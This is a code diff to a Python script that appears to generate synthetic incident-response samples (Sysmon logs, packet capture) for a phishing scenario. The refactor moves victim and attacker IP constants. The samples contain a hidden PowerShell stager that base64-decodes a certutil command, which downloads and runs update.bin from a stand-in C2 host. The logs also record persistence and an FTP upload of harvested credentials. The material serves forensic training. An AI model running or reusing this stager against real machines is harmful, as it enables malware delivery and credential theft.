@@ -39,8 +39,10 @@ EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!
 # certutil fetching the payload from the email's originating IP, then
 # starting it. Plain ASCII base64 (decoded with FromBase64String), not
 # -EncodedCommand's UTF-16, so CyberChef's Magic decodes it in one step.
-_STAGER = ('certutil -urlcache -split -f http://203.0.113.66/update.bin C:\\Users\\Public\\update.exe; '
-           'Start-Process C:\\Users\\Public\\update.exe')
+_VICTIM, _C2 = '10.20.4.12', '203.0.113.66'
+_DROPPED = 'C:\\Users\\Public\\update.exe'
+_DOWNLOAD = f'-urlcache -split -f http://{_C2}/update.bin {_DROPPED}'
+_STAGER = f'certutil {_DOWNLOAD}; Start-Process {_DROPPED}'
 _STAGER_COMMAND = ('powershell.exe -nop -w hidden -c "IEX([Text.Encoding]::ASCII.GetString('
                    "[Convert]::FromBase64String('%s')))\"" % base64.b64encode(_STAGER.encode()).decode())
 # The phishing link carries the recipient's address, base64-encoded, so the
@@ -174,7 +176,6 @@ _SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': '
 _WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
 _POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
 _CMD = 'C:\\Windows\\System32\\cmd.exe'
-_DROPPED = 'C:\\Users\\Public\\update.exe'
 
 
 def _process(time, pid, image, command_line, parent_pid, parent_image, parent_command_line,
@@ -202,12 +203,12 @@ def build_log_sample():
         _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
                  _STAGER_COMMAND, 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
         _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
-                 f'certutil.exe -urlcache -split -f http://203.0.113.66/update.bin {_DROPPED}',
+                 f'certutil.exe {_DOWNLOAD}',
                  7044, _POWERSHELL, _STAGER_COMMAND),
         dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
              Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
-             Initiated='true', SourceIp='10.20.4.12', SourcePort=51733,
-             DestinationIp='203.0.113.66', DestinationPort=80),
+             Initiated='true', SourceIp=_VICTIM, SourcePort=51733,
+             DestinationIp=_C2, DestinationPort=80),
         _process('2026-02-03T08:45:02.690Z', 7390, 'C:\\Windows\\System32\\whoami.exe', 'whoami /all',
                  7372, _CMD, 'cmd.exe /c whoami /all'),
         _process('2026-02-03T08:45:20.233Z', 7466, 'C:\\Windows\\System32\\schtasks.exe',
@@ -226,12 +227,11 @@ def build_log_sample():
         # The upload the pcap sample shows - harvested credentials, by FTP.
         dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:46:10.204Z', ProcessId=7302,
              Image=_DROPPED, User='CORP\\jordan.lee', Protocol='tcp', Initiated='true',
-             SourceIp='10.20.4.12', SourcePort=51790, DestinationIp='203.0.113.66', DestinationPort=21),
+             SourceIp=_VICTIM, SourcePort=51790, DestinationIp=_C2, DestinationPort=21),
     ]
     return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()
 
 
-_VICTIM, _C2 = '10.20.4.12', '203.0.113.66'
 _VICTIM_MAC, _GATEWAY_MAC = bytes.fromhex('0050569a4c12'), bytes.fromhex('00163e1d2b01')
 _MSS = 1448
 
